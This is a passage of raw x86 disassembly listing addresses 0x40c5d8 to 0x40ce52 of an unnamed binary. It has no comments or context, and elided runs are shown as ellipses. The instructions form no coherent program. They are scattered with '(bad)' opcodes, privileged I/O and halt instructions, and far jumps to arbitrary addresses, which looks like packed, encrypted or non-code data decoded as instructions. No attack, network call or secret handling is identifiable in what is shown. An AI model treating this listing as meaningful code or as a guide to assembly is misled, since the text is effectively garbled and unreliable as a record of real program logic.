  40c5d8:	arpl   WORD PTR [ecx+ebp*2+0x40],ax
  40c5dc:	pop    eax
  40c5dd:	scas   eax,DWORD PTR es:[edi]
  40c5de:	fucomip st,st(3)
  40c5e0:	push   ecx
  40c5e1:	ret    0xda2e
  40c5e4:	xchg   esi,eax
  40c5e5:	push   esp
  40c5e6:	pushf  
  40c5e7:	cld    
  40c5e8:	shr    DWORD PTR [edi+ebx*8-0x77fcd4fd],cl
  40c5ef:	pop    ss
  40c5f0:	scas   al,BYTE PTR es:[edi]
  40c5f1:	aad    0xdf
  40c5f3:	xor    ebp,DWORD PTR [ebx]
  40c5f5:	retf   0xebf7
	...
  40c60c:	mov    ds:0x33d9fef6,eax
  40c611:	push   cs
  40c612:	jns    0x40c5ee
  40c614:	adc    dl,BYTE PTR [eax]
  40c616:	adc    eax,0xdfd55431
  40c61b:	mov    eax,es
  40c61d:	fbld   TBYTE PTR [edi]
  40c61f:	inc    ebx
  40c620:	mov    WORD PTR [edi+eax*1],ss
  40c623:	add    al,0x78
  40c625:	fst    DWORD PTR [edi+0x4b]
  40c628:	outs   dx,BYTE PTR ds:[esi]
  40c629:	aad    0xdf
  40c62b:	xor    ah,dh
  40c62d:	xor    eax,0x8f8c0445
  40c632:	lahf   
  40c633:	push   eax
  40c634:	jae    0x40c620
  40c636:	xchg   edi,eax
  40c637:	(bad)  
  40c638:	cmove  edx,DWORD PTR [edi-0x206bcbcc]
  40c63f:	call   0x6604733d
  40c644:	dec    ebp
  40c645:	xchg   esp,eax
  40c646:	psubusw mm4,QWORD PTR [eax]
  40c649:	mov    WORD PTR [edi+0x943ee43],ss
  40c64f:	jbe    0x40c5f9
  40c651:	int    0x6f
  40c653:	outs   dx,BYTE PTR ds:[esi]
  40c654:	mov    ch,0x2e
  40c656:	or     BYTE PTR [edi-0x2bf77ef1],ch
  40c65c:	popa   
  40c65d:	fxtract 
  40c65f:	sbb    dl,BYTE PTR [eax-0x4]
  40c662:	cmc    
  40c663:	dec    esi
  40c664:	push   ebp
  40c665:	inc    edx
  40c666:	sti    
  40c667:	xchg   edi,eax
  40c668:	mov    BYTE PTR [ebx-0x37ba7d85],bl
  40c66e:	hlt    
  40c66f:	add    BYTE PTR ss:[eax],al
	...
  40c682:	add    BYTE PTR [eax],al
  40c684:	retf   
  40c685:	mov    eax,fs
  40c687:	xchg   DWORD PTR [esi-0x7a3909bd],edi
  40c68d:	dec    ebp
  40c68e:	retf   
  40c68f:	in     eax,0x8f
  40c691:	jmp    0x5751cc17
  40c696:	cmc    
  40c697:	mov    bh,0x7c
  40c699:	scas   al,BYTE PTR es:[edi]
  40c69a:	or     BYTE PTR [ebx-0xe83bc88],dl
  40c6a0:	aaa    
  40c6a1:	fnstcw WORD PTR [esi-0xa]
  40c6a4:	xor    al,0xc
  40c6a6:	dec    esp
  40c6a7:	in     eax,dx
  40c6a8:	add    BYTE PTR [eax-0x6bb0cea3],cl
  40c6ae:	sbb    DWORD PTR [ecx+eax*8],0xfe947cc
  40c6b5:	or     BYTE PTR [eax],0x55
  40c6b8:	mov    bl,0xac
  40c6ba:	push   esp
  40c6bb:	dec    ebx
  40c6bc:	dec    edi
  40c6bd:	xchg   esp,eax
  40c6be:	pop    ebp
  40c6bf:	shr    DWORD PTR [eax-0x47],1
  40c6c2:	or     cl,ch
  40c6c4:	mov    BYTE PTR [ebp+edi*2-0x32],dl
  40c6c8:	popf   
  40c6c9:	sub    al,0xbe
  40c6cb:	imul   esp,esp,0x41
  40c6ce:	pop    ecx
  40c6cf:	adc    DWORD PTR [eax+0x2757e594],ecx
  40c6d5:	shr    BYTE PTR [edx+0x28],cl
  40c6d8:	mov    ah,ah
  40c6da:	cmc    
  40c6db:	add    BYTE PTR [eax+0x54c3e08e],ch
  40c6e1:	pop    esp
  40c6e2:	imul   eax
  40c6e4:	icebp  
  40c6e5:	fdivrp st(5),st
  40c6e7:	inc    DWORD PTR [eax]
	...
  40c6f9:	add    BYTE PTR [eax],al
  40c6fb:	add    BYTE PTR [esi],cl
  40c6fd:	xchg   esi,eax
  40c6fe:	dec    esi
  40c6ff:	xor    BYTE PTR [ebx+0x2bfa7b98],0x6a
  40c706:	cmp    eax,eax
  40c708:	sbb    al,0x5d
  40c70a:	idiv   edi
  40c70c:	ret    0xa467
  40c70f:	cmp    BYTE PTR [edx-0x2d],bh
  40c712:	mov    cl,0xff
  40c714:	sbb    BYTE PTR [edx-0x9],ch
  40c717:	jne    0x40c786
  40c719:	cs cs jbe 0x40c6bf
  40c71d:	pop    esp
  40c71e:	push   edi
  40c71f:	pop    esi
  40c720:	jl     0x40c779
  40c722:	or     al,BYTE PTR [eax]
  40c724:	clc    
  40c725:	adc    dl,ah
  40c727:	sub    DWORD PTR [ecx+0x69],0x60
  40c72b:	add    BYTE PTR [edi],cl
  40c72d:	jp     0x40c724
  40c72f:	jne    0x40c74e
  40c731:	shl    BYTE PTR cs:[ebp+0x22],0x6a
  40c736:	add    DWORD PTR [ebp+0x21],0x256a08b1
  40c73d:	scas   al,BYTE PTR es:[edi]
  40c73e:	bound  esi,QWORD PTR fs:[eax+ebx*4-0x6a0affa0]
  40c746:	mov    al,ch
  40c748:	jns    0x40c727
  40c74a:	cmc    
  40c74b:	(bad)  
  40c74c:	out    dx,al
  40c74d:	push   ebp
  40c74e:	jp     0x40c76f
  40c750:	test   DWORD PTR [eax],esi
  40c752:	dec    edx
  40c753:	and    BYTE PTR [edx],0x6a
  40c756:	inc    esi
  40c757:	push   0xbee595e5
  40c75c:	dec    ebp
  40c75d:	mov    ch,0x6a
  40c75f:	inc    ecx
	...
  40c774:	mov    ch,0x85
  40c776:	cmc    
  40c777:	jne    0x40c736
  40c779:	sub    eax,0x2a8ca146
  40c77e:	fsubrp st(7),st
  40c780:	push   ebp
  40c781:	mov    ds:0x40abfedd,eax
  40c786:	fdivp  st(6),st
  40c788:	sbb    DWORD PTR [ebx-0x1e],eax
  40c78b:	retf   
  40c78c:	and    edx,ecx
  40c78e:	(bad)  
  40c790:	into   
  40c791:	aaa    
  40c792:	or     dl,BYTE PTR [ebp+0x17]
  40c795:	out    0x89,eax
  40c797:	ret    
  40c798:	and    BYTE PTR [ebp+0xa],0x6a
  40c79c:	test   eax,0x640857ea
  40c7a1:	pop    ebx
  40c7a2:	pop    ecx
  40c7a3:	jmp    FWORD PTR [ebx-0x3c]
  40c7a6:	inc    edi
  40c7a7:	cld    
  40c7a8:	hlt    
  40c7a9:	sub    ecx,DWORD PTR [edx]
  40c7ab:	out    dx,eax
  40c7ac:	sbb    dl,BYTE PTR [ebx-0x5e]
  40c7af:	popa   
  40c7b0:	int    0x2b
  40c7b2:	bound  esi,QWORD PTR [esi+ebp*4-0x4600f614]
  40c7b9:	inc    ebx
  40c7ba:	loop   0x40c816
  40c7bc:	in     eax,dx
  40c7bd:	test   eax,0x8fb9fedd
  40c7c2:	fnsave [esp+edx*4-0x5d]
  40c7c6:	jnp    0x40c83c
  40c7c8:	and    eax,DWORD PTR [edx-0x3b]
  40c7cb:	rcl    DWORD PTR [eax+0x208b392b],0xae
  40c7d2:	enter  0x76fb,0x2b
  40c7d6:	pusha  
  40c7d7:	add    BYTE PTR cs:[eax],al
	...
  40c7ea:	add    BYTE PTR [eax],al
  40c7ec:	add    ebp,eax
  40c7ee:	add    al,0xe8
  40c7f0:	shl    eax,0xdd
  40c7f3:	inc    BYTE PTR ds:0x8c67d078
  40c7f9:	sub    ebp,edi
  40c7fb:	mov    ebp,0x4167c274
  40c800:	mov    ebx,ss
  40c802:	mov    eax,0xdf2b4d61
  40c807:	je     0x40c79d
  40c809:	xchg   esp,eax
  40c80a:	xchg   edi,eax
  40c80b:	and    ebp,ebp
  40c80d:	inc    eax
  40c80e:	xchg   edi,eax
  40c80f:	imul   ecx,DWORD PTR [esp+edx*4+0x4e2b958e],0x2
  40c817:	inc    ebp
  40c818:	mov    WORD PTR [ebx+edx*4+0x76944d61],gs
  40c81f:	push   eax
  40c820:	test   BYTE PTR [ecx+ebp*8],ch
  40c823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c824:	xchg   edx,eax
  40c825:	inc    eax
  40c826:	addr16 push eax
  40c828:	mov    BYTE PTR [eax-0x2b],al
  40c82b:	or     esi,DWORD PTR [eax+eax*4-0x24]
  40c82f:	(bad)  
  40c830:	jp     0x40c880
  40c832:	and    bh,bh
  40c834:	jae    0x40c81f
  40c836:	push   0xffffffe7
  40c838:	push   cs
  40c839:	pop    ecx
  40c83a:	dec    esp
  40c83b:	mov    bh,BYTE PTR [eax-0x1a0e855c]
  40c841:	xchg   esp,eax
  40c842:	ins    BYTE PTR es:[edi],dx
  40c843:	inc    eax
  40c844:	push   eax
  40c845:	in     eax,0x26
  40c847:	push   eax
  40c848:	xchg   esp,eax
  40c849:	stos   BYTE PTR es:[edi],al
  40c84a:	(bad)  
  40c84c:	mov    eax,0x3116a4
	...
  40c861:	add    BYTE PTR [eax],al
  40c863:	add    BYTE PTR [eax+0x6b502019],bl
  40c869:	or     edi,DWORD PTR [ebp-0x2054e429]
  40c86f:	imul   ecx,DWORD PTR [esp+ebp*4-0x6b73fe0a],0xaa804ffe
  40c87a:	out    0xd5,al
  40c87c:	jge    0x40c816
  40c87e:	pop    ecx
  40c87f:	add    al,0x76
  40c881:	xchg   esp,eax
  40c882:	xlat   BYTE PTR ds:[ebx]
  40c883:	mov    ebp,0x73df946d
  40c888:	repnz leave 
  40c88a:	ret    
  40c88b:	in     al,dx
  40c88c:	imul   esi,DWORD PTR [ebx+0x52d503df],0xb4103e4
  40c896:	or     ebp,eax
  40c898:	or     eax,0x7b62f554
  40c89d:	test   al,0x81
  40c89f:	sti    
  40c8a0:	xor    eax,0xd4248394
  40c8a5:	iret   
  40c8a6:	cmc    
  40c8a7:	sbb    al,0x84
  40c8a9:	aas    
  40c8aa:	jl     0x40c88d
  40c8ac:	xor    eax,0xb3fcf594
  40c8b1:	ds pop ebx
  40c8b3:	rcr    DWORD PTR [edx],1
  40c8b5:	(bad)  
  40c8b6:	jnp    0x40c886
  40c8b8:	add    al,0xe9
  40c8ba:	hlt    
  40c8bb:	pop    ecx
  40c8bc:	not    BYTE PTR [edx+eiz*2+0xa3ff7e9]
  40c8c3:	jmp    0xf9bd0857
	...
  40c8dc:	in     eax,0x3f
  40c8de:	neg    bl
  40c8e0:	imul   ebp,DWORD PTR [ebp+0x2c8fd308],0x70
  40c8e7:	retf   
  40c8e8:	(bad)  
  40c8e9:	xchg   esp,eax
  40c8ea:	cwde   
  40c8eb:	ss ret 
  40c8ed:	inc    eax
  40c8ee:	loope  0x40c8e9
  40c8f0:	lods   al,BYTE PTR ds:[esi]
  40c8f1:	xchg   esp,eax
  40c8f2:	or     BYTE PTR [eax],dh
  40c8f4:	dec    esi
  40c8f5:	(bad)
  40c8f9:	sub    ecx,DWORD PTR [edx-0x7619efd3]
  40c8ff:	mov    WORD PTR [edi],fs
  40c901:	aas    
  40c902:	jge    0x40c8f0
  40c904:	pop    eax
  40c905:	dec    ebp
  40c906:	retf   
  40c907:	aad    0x8f
  40c909:	or     ebx,DWORD PTR [ebp+ebx*8+0x4]
  40c90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90e:	and    DWORD PTR [edi+eiz*1-0x27169d31],0xffffffc7
  40c916:	add    al,0xde
  40c918:	dec    edx
  40c919:	mov    WORD PTR [edx-0x17],fs
  40c91c:	fadd   st,st(7)
  40c91e:	sbb    al,0xce
  40c920:	popf   
  40c921:	call   0xce75c9b1
  40c926:	pop    edx
  40c927:	(bad)  
  40c928:	mov    al,0x1c
  40c92a:	idiv   bh
  40c92c:	in     eax,0x92
  40c92e:	adc    DWORD PTR [ebp+0x3d],0x708d180c
  40c935:	sbb    al,0x46
  40c937:	lea    esi,[eax+0x58]
  40c93a:	inc    esi
  40c93b:	push   0xffffffb5
  40c93d:	addr16 jge 0x40c8f8
	...
  40c954:	sbb    al,BYTE PTR [ebp+0x1c888304]
  40c95a:	div    BYTE PTR [ebx-0x30]
  40c95d:	adc    eax,0xce1ac075
  40c962:	sbb    al,0xff
  40c964:	add    BYTE PTR [edx-0x9],0x37
  40c968:	jmp    0xf58a:0x60ff04ce
  40c96f:	push   ebp
  40c970:	jge    0x40c9db
  40c972:	aas    
  40c973:	call   0x497d2d
  40c978:	test   BYTE PTR [eax],0xa
  40c97b:	jmp    FWORD PTR [eax]
  40c97d:	es jge 0x40c960
  40c980:	into   
  40c981:	sbb    al,BYTE PTR [ebx+0x180cbd55]
  40c987:	jmp    DWORD PTR [eax]
  40c989:	sbb    dh,bh
  40c98b:	push   edx
  40c98c:	cmp    eax,0x31c2bf89
  40c991:	xchg   edx,eax
  40c992:	pop    ebx
  40c993:	mov    ebp,DWORD PTR [ecx]
  40c995:	adc    al,0xca
  40c997:	clc    
  40c998:	mov    ebp,DWORD PTR [eax-0x9]
  40c99b:	push   edi
  40c99c:	sahf   
  40c99d:	outs   dx,BYTE PTR ds:[esi]
  40c99e:	sbb    BYTE PTR [ebx-0x772e8c9],cl
  40c9a4:	sti    
  40c9a5:	popa   
  40c9a6:	not    DWORD PTR [eax+0x5f]
  40c9a9:	cwde   
  40c9aa:	cmc    
  40c9ab:	jne    0x40c9aa
  40c9ad:	fisttp WORD PTR [eax]
  40c9af:	dec    DWORD PTR [eax+eiz*8-0x70c10104]
  40c9b6:	jg     0x40c977
	...
  40c9cc:	pop    ecx
  40c9cd:	loope  0x40c990
  40c9cf:	test   al,bl
  40c9d1:	std    
  40c9d2:	fsin   
  40c9d4:	mov    WORD PTR [ebx],gs
  40c9d6:	or     al,BYTE PTR [eax]
  40c9d8:	pop    ss
  40c9d9:	jmp    0xf704c7a2
  40c9de:	jne    0x40c9f1
  40c9e0:	or     DWORD PTR [ecx+0x26b3fdd8],edi
  40c9e6:	cmp    eax,0xdb2c118d
  40c9eb:	(bad)  
  40c9ec:	mov    ds:0x9b10569b,eax
  40c9f1:	mov    ah,al
  40c9f3:	std    
  40c9f4:	xchg   ebx,eax
  40c9f5:	(bad)  
  40c9f6:	fst    DWORD PTR [ecx-0x68]
  40c9f9:	stos   BYTE PTR es:[edi],al
  40c9fa:	xchg   edi,eax
  40c9fb:	sti    
  40c9fc:	xor    BYTE PTR [esi-0x67000027],0x87
  40ca03:	mov    esp,0xfed9e68c
  40ca08:	imul   ebp,DWORD PTR [eax-0x2],0xfffffffe
  40ca0c:	fstp   DWORD PTR [ebx-0x25]
  40ca0f:	je     0x40c999
  40ca11:	(bad)  es:[esp+eax*4-0x2d]
  40ca16:	add    edi,edi
  40ca18:	dec    ebx
  40ca19:	outs   dx,BYTE PTR ds:[esi]
  40ca1a:	(bad)  
  40ca1b:	(bad)  
  40ca1c:	pushf  
  40ca1d:	jbe    0x40c9a6
  40ca1f:	sti    
  40ca20:	cmp    bl,BYTE PTR [esi-0x6dd08b27]
  40ca26:	mov    eax,ds:0xdaa3018a
  40ca2b:	(bad)  
  40ca2c:	and    eax,edx
  40ca2e:	(bad)  
  40ca2f:	inc    BYTE PTR [eax]
	...
  40ca41:	add    BYTE PTR [eax],al
  40ca43:	add    cl,ah
  40ca45:	xchg   edx,eax
  40ca46:	(bad)  
  40ca48:	adc    eax,DWORD PTR [esi+0x3c]
  40ca4b:	or     BYTE PTR [ebx+0x74],ch
  40ca4e:	into   
  40ca4f:	jl     0xe7bffee9
  40ca55:	adc    ch,BYTE PTR [ebx+ecx*8+0x3adf3cf1]
  40ca5c:	pop    ss
  40ca5d:	out    0xd3,eax
  40ca5f:	jle    0x40cade
  40ca61:	pcmpgtw mm1,mm3
  40ca64:	fnstcw WORD PTR [edi+esi*4]
  40ca67:	xor    esp,DWORD PTR [esi-0x6c]
  40ca6a:	dec    ecx
  40ca6b:	add    al,0xcb
  40ca6d:	(bad)  
  40ca6e:	rcl    edx,cl
  40ca70:	pop    ebp
  40ca71:	jl     0x40cad7
  40ca73:	ret    
  40ca74:	inc    eax
  40ca75:	mov    dl,0xae
  40ca77:	dec    eax
  40ca78:	mov    al,0x93
  40ca7a:	fild   WORD PTR [ebx]
  40ca7c:	mov    WORD PTR [ebx+ebp*2],fs
  40ca7f:	js     0x40ca1c
  40ca81:	cmp    eax,0xa206d28f
  40ca86:	fs dec eax
  40ca88:	nop
  40ca89:	jecxz  0x40caf7
  40ca8b:	mov    BYTE PTR [edi-0x2c2d98c5],al
  40ca91:	scas   al,BYTE PTR es:[edi]
  40ca92:	out    dx,eax
  40ca93:	rol    BYTE PTR [eax+0x3d],cl
  40ca96:	push   esi
  40ca97:	shl    BYTE PTR [edx+0x3c],cl
  40ca9a:	mov    dl,0xff
  40ca9c:	sbb    ebx,DWORD PTR [eax]
  40ca9e:	(bad)
  40caa1:	or     al,0xb4
  40caa3:	es or  edx,edi
  40caa6:	xor    edx,ecx
	...
  40cabc:	push   edx
  40cabd:	cmp    al,0x50
  40cabf:	rol    al,cl
  40cac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cac2:	es pop eax
  40cac4:	nop
  40cac5:	cmp    edx,DWORD PTR [ebp-0x1dd31d05]
  40cacb:	shl    BYTE PTR [edx],cl
  40cacd:	cmp    al,0x63
  40cacf:	retf   0x249b
  40cad2:	pop    es
  40cad3:	inc    eax
  40cad4:	and    BYTE PTR ds:0x300be975,ah
  40cada:	inc    edi
  40cadb:	jle    0x40cad5
  40cadd:	cmp    al,0x9
  40cadf:	neg    ebp
  40cae1:	cmp    al,BYTE PTR [edx-0xeff2125]
  40cae7:	out    0xdd,eax
  40cae9:	cmp    dh,dh
  40caeb:	cmp    esi,eax
  40caed:	fidivr DWORD PTR [edi+0x5b948cab]
  40caf3:	(bad)  
  40caf4:	in     al,dx
  40caf5:	cmp    bh,BYTE PTR [ecx+esi*8-0x44]
  40caf9:	rcl    BYTE PTR [eax],0xd1
  40cafc:	test   al,0xc6
  40cafe:	cmc    
  40caff:	mov    dh,0xdd
  40cb01:	rol    BYTE PTR [ecx+eax*8],0xa3
  40cb05:	mov    ch,0x8
  40cb07:	jmp    0xa9cb270a
  40cb0c:	mov    ah,ah
  40cb0e:	cmc    
  40cb0f:	sbb    al,0x8c
  40cb11:	cmp    edi,DWORD PTR [ecx+esi*8-0x39]
  40cb15:	js     0x40cb91
  40cb17:	xchg   BYTE PTR [ebp-0x432a83c6],bh
  40cb1d:	rcr    BYTE PTR [eax],0x76
	...
  40cb34:	jecxz  0x40cad2
  40cb36:	loopne 0x40caf6
  40cb38:	fnstcw WORD PTR [ebx]
  40cb3a:	div    BYTE PTR [eax]
  40cb3c:	push   edx
  40cb3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb3e:	or     BYTE PTR [eax+esi*8+0x67dcf62f],dh
  40cb45:	cmp    bh,BYTE PTR [ecx+esi*8+0x47]
  40cb49:	xor    bh,BYTE PTR [eax+0x46]
  40cb4c:	cmp    eax,0x37ed7c3a
  40cb51:	xchg   edi,eax
  40cb52:	push   0x58d48fe9
  40cb57:	fisttp DWORD PTR cs:[eax+0x33279cf5]
  40cb5e:	add    DWORD PTR [ebx-0x6309c5a4],ebx
  40cb64:	and    edi,DWORD PTR [edx]
  40cb66:	jl     0x40cb61
  40cb68:	cmp    al,0xc0
  40cb6a:	adc    BYTE PTR [eax],al
  40cb6c:	jge    0x40cbb8
  40cb6e:	jns    0x40cb6f
  40cb70:	adc    bh,dh
  40cb72:	(bad)  
  40cb73:	adc    al,0xf5
  40cb75:	add    DWORD PTR [ecx-0x25b38b14],0xf763f2f7
  40cb7f:	jne    0x40cb0e
  40cb81:	mov    ebx,0x63c1008c
  40cb86:	not    DWORD PTR [eax-0x2e]
  40cb89:	loope  0x40cb8b
  40cb8b:	call   0x38156a
  40cb90:	aas    
  40cb91:	nop
  40cb92:	bound  eax,QWORD PTR [eax]
  40cb94:	dec    ebp
  40cb95:	or     eax,DWORD PTR gs:[eax]
	...
  40cbac:	mov    ch,0xb9
  40cbae:	mov    WORD PTR [eax],es
  40cbb0:	in     eax,dx
  40cbb1:	arpl   di,si
  40cbb3:	push   eax
  40cbb4:	lahf   
  40cbb5:	div    DWORD PTR gs:[ebp-0x5b]
  40cbb9:	fmul   DWORD PTR [eax]
  40cbbb:	push   0xffffffb5
  40cbbd:	pop    esi
  40cbbe:	adc    al,0x60
  40cbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbc1:	xchg   esi,eax
  40cbc2:	int    0x85
  40cbc4:	adc    eax,0x65fff75c
  40cbc9:	xchg   esi,eax
  40cbca:	or     BYTE PTR [eax],al
  40cbcc:	sub    dl,BYTE PTR [ebx]
  40cbce:	cli    
  40cbcf:	div    edx
  40cbd1:	or     BYTE PTR fs:[eax],al
  40cbd4:	gs xchg esi,eax
  40cbd6:	int    0x85
  40cbd8:	mov    ebp,0x75fff75c
  40cbdd:	xchg   esi,eax
  40cbde:	or     BYTE PTR [eax],al
  40cbe0:	stos   BYTE PTR es:[edi],al
  40cbe1:	adc    dh,dl
  40cbe3:	not    DWORD PTR [edx+0x35fff664]
  40cbe9:	xchg   esi,eax
  40cbea:	adc    DWORD PTR [ebp+0x5d],0x256a17b9
  40cbf1:	mov    ebx,0x649af08c
  40cbf6:	not    DWORD PTR [eax-0x74]
  40cbf9:	mov    al,0x8e
  40cbfb:	jmp    0x40cc18
  40cbfd:	mov    ebx,eax
  40cbff:	dec    edi
  40cc00:	or     DWORD PTR [ecx+0x3b13f6d1],ebp
  40cc06:	cmp    edi,edi
  40cc08:	sbb    DWORD PTR [ebx-0x27],0x5c2a9074
  40cc0f:	or     BYTE PTR [eax],al
	...
  40cc21:	add    BYTE PTR [eax],al
  40cc23:	add    BYTE PTR [esi+0x2b],ah
  40cc26:	(bad)  
  40cc27:	je     0x40cbbd
  40cc29:	pop    edx
  40cc2a:	cmp    eax,DWORD PTR [edi+ecx*1+0x21]
  40cc2e:	aad    0xf6
  40cc30:	jecxz  0x40cc7c
  40cc32:	or     eax,0xd30100f
  40cc37:	add    BYTE PTR [esi+ebp*4+0x2c3eb97],cl
  40cc3e:	(bad)  
  40cc3f:	call   DWORD PTR [edx-0x73ff0a51]
  40cc45:	sub    ecx,edi
  40cc47:	test   al,bl
  40cc49:	and    al,dh
  40cc4b:	dec    BYTE PTR [ebx+ebp*1+0xe34bdd7]
  40cc52:	imul   eax,DWORD PTR [ecx-0x74],0xffffffc0
  40cc56:	jg     0x40cc57
  40cc58:	xchg   edi,eax
  40cc59:	mov    edx,0xe7744fc5
  40cc5e:	and    eax,0xccb08c00
  40cc63:	jae    0x40cc33
  40cc65:	push   0x7f
  40cc67:	sar    DWORD PTR [ebx-0x26],cl
  40cc6a:	lds    eax,FWORD PTR [eax]
  40cc6c:	mov    edx,ss
  40cc6e:	xchg   BYTE PTR [edi+0x59],ah
  40cc71:	dec    ebp
  40cc72:	dec    ebp
  40cc73:	add    BYTE PTR [ecx],cl
  40cc75:	test   al,0xc
  40cc77:	cld    
  40cc78:	push   ebx
  40cc79:	jp     0x40ccb7
  40cc7b:	call   0x4aee71
  40cc80:	or     DWORD PTR [ebx+0x50],ebp
  40cc83:	and    edx,DWORD PTR [ebx-0x6c]
  40cc86:	fs mov eax,0x0
	...
  40cc9c:	cmp    bh,BYTE PTR [ecx]
  40cc9e:	pop    ss
  40cc9f:	add    cl,BYTE PTR [ecx+ebp*1-0x4a6ea3a2]
  40cca6:	mov    al,ds:0xe00f0903
  40ccab:	iret   
  40ccac:	adc    bh,BYTE PTR [ecx]
  40ccae:	nop
  40ccaf:	fist   DWORD PTR [ecx]
  40ccb1:	(bad)  
  40ccb3:	add    ecx,DWORD PTR [ecx]
  40ccb5:	push   esp
  40ccb6:	xlat   BYTE PTR ds:[ebx]
  40ccb7:	mov    BYTE PTR [esi],ch
  40ccb9:	xchg   esp,eax
  40ccba:	fild   WORD PTR [ebx]
  40ccbc:	fs jae 0x40cd01
  40ccbf:	inc    ebp
  40ccc0:	mov    WORD PTR [edi],es
  40ccc2:	gs add esp,esp
  40ccc5:	cmp    bh,al
  40ccc7:	xor    esp,esp
  40ccc9:	stos   BYTE PTR es:[edi],al
  40ccca:	aas    
  40cccb:	add    al,0x8c
  40cccd:	lea    ebx,[edi-0x2eac2a9]
  40ccd3:	mov    al,ds:0x3dfd356
  40ccd8:	mov    edx,DWORD PTR [eax]
  40ccda:	popa   
  40ccdb:	add    ecx,DWORD PTR [esp+edx*4+0x40b39896]
  40cce2:	lahf   
  40cce3:	into   
  40cce4:	adc    cl,BYTE PTR [edi]
  40cce6:	adc    dh,0x9a
  40cce9:	cmp    BYTE PTR [edi+0x7740a798],cl
  40ccef:	into   
  40ccf0:	sbb    dl,BYTE PTR [edx]
  40ccf2:	test   dh,dl
  40ccf4:	cmp    BYTE PTR [eax],0x55
  40ccf7:	mov    BYTE PTR [ebx+0x40],ah
  40ccfa:	outs   dx,DWORD PTR ds:[esi]
  40ccfb:	into   
  40ccfc:	ret    
  40ccfd:	stos   BYTE PTR es:[edi],al
  40ccfe:	loopne 0x40cd59
	...
  40cd14:	mov    WORD PTR [edx-0x5573a621],gs
  40cd1a:	fild   WORD PTR [eax-0x31c8caf0]
  40cd20:	push   edx
  40cd21:	in     eax,0x36
  40cd23:	clc    
  40cd24:	clc    
  40cd25:	retf   
  40cd26:	or     BYTE PTR [eax-0x4a377471],ch
  40cd2c:	shl    BYTE PTR [edi],cl
  40cd2e:	jl     0x40cd2d
  40cd30:	inc    edx
  40cd31:	add    ecx,edx
  40cd33:	push   ss
  40cd34:	pop    edx
  40cd35:	aaa    
  40cd36:	neg    BYTE PTR [ebx+esi*8+0x3e]
  40cd3a:	test   BYTE PTR [esi],0x4a
  40cd3d:	rcr    DWORD PTR [eax],0x6
  40cd40:	hlt    
  40cd41:	arpl   si,di
  40cd43:	(bad)  
  40cd44:	fldcw  WORD PTR [edi]
  40cd46:	sbb    edi,esi
  40cd48:	shl    DWORD PTR [esi],1
  40cd4a:	div    BYTE PTR [ebx+ebp*1]
  40cd4d:	aas    
  40cd4e:	mul    dh
  40cd50:	shr    BYTE PTR [ebp+0x2b8fe956],1
  40cd56:	adc    al,0xd6
  40cd58:	cmp    esp,DWORD PTR [eax+0x3eb894f5]
  40cd5e:	test   dh,0xc1
  40cd61:	add    ch,ah
  40cd63:	mov    dh,0xd9
  40cd65:	idiv   BYTE PTR ss:[eax+edi*4]
  40cd69:	ss mov esp,0xf636e195
  40cd6f:	xchg   ecx,eax
  40cd70:	stos   BYTE PTR es:[edi],al
  40cd71:	cmp    dh,dh
  40cd73:	sahf   
  40cd74:	fld    DWORD PTR [eax]
  40cd76:	in     eax,0x9e
	...
  40cd8c:	shl    DWORD PTR [esi],1
  40cd8e:	loope  0x40cd99
  40cd90:	imul   edx,DWORD PTR [eax+ecx*1+0x8a3ceb0],0x8a2c0514
  40cd9b:	lods   eax,DWORD PTR ds:[esi]
  40cd9c:	sbb    cl,ah
  40cd9e:	cmc    
  40cd9f:	hlt    
  40cda0:	jnp    0x40cdd1
  40cda2:	add    al,dh
  40cda4:	(bad)  
  40cda5:	xchg   esp,eax
  40cda6:	add    DWORD PTR [ecx],ebp
  40cda8:	ret    
  40cda9:	xchg   ecx,eax
  40cdaa:	push   esi
  40cdab:	and    BYTE PTR [esi-0x75],cl
  40cdae:	or     BYTE PTR [eax],bh
  40cdb0:	jo     0x40cdc4
  40cdb2:	leave  
  40cdb3:	add    BYTE PTR [edi-0x44],ah
  40cdb6:	lds    ecx,FWORD PTR [ebp+0x524656f0]
  40cdbc:	jp     0x40cd9d
  40cdbe:	add    al,0xe8
  40cdc0:	pushf  
  40cdc1:	mov    bh,0xf6
  40cdc3:	call   FWORD PTR [esi-0x6]
  40cdc6:	or     BYTE PTR [ebp+0x61],0x5d
  40cdca:	add    BYTE PTR [esi],dh
  40cdcc:	sub    ah,BYTE PTR [ecx]
  40cdce:	dec    edx
  40cdcf:	sub    DWORD PTR [ecx],ebx
  40cdd1:	xchg   edx,eax
  40cdd2:	dec    ebx
  40cdd3:	aam    0xe4
  40cdd5:	adc    esi,ecx
  40cdd7:	adc    al,0x87
  40cdd9:	bound  esp,QWORD PTR [ebx]
  40cddb:	imul   BYTE PTR [edi+ebx*8-0x28]
  40cddf:	jmp    0x40cdae
  40cde1:	mov    al,ds:0x96a1b605
  40cde6:	in     al,0x50
  40cde8:	cmp    eax,0xf5416967
  40cded:	mov    ch,0x4c
  40cdef:	fadd   DWORD PTR [eax]
	...
  40ce01:	add    BYTE PTR [eax],al
  40ce03:	add    BYTE PTR [ebp-0x1aa0f9a8],dl
  40ce09:	xchg   edx,eax
  40ce0a:	mov    esp,eax
  40ce0c:	mov    ecx,0xa5d84cb5
  40ce11:	dec    ecx
  40ce12:	jge    0x40cde4
  40ce14:	int    0xec
  40ce16:	jnp    0x40ce17
  40ce18:	jmp    0xf415:0x73d04cb9
  40ce1f:	adc    al,0x87
  40ce21:	add    eax,0x47e16589
  40ce26:	idiv   bh
  40ce28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce29:	inc    edi
  40ce2a:	jge    0x40ce00
  40ce2c:	popf   
  40ce2d:	imul   eax,DWORD PTR gs:[ecx+0x75],0x95d84cb7
  40ce35:	pop    eax
  40ce36:	(bad)  
  40ce37:	pop    esi
  40ce38:	gs xchg edx,eax
  40ce3a:	mov    esp,eax
  40ce3c:	jns    0x40cdf5
  40ce3e:	dec    esp
  40ce3f:	fmul   DWORD PTR [ebx+edi*8-0x2bc38b3c]
  40ce46:	(bad)  
  40ce47:	jne    0x40ce9c
  40ce49:	iret   
  40ce4a:	jb     0x40ce90
  40ce4c:	pop    esp
  40ce4d:	test   eax,0x7edccc4e
  40ce52:	pop    esi
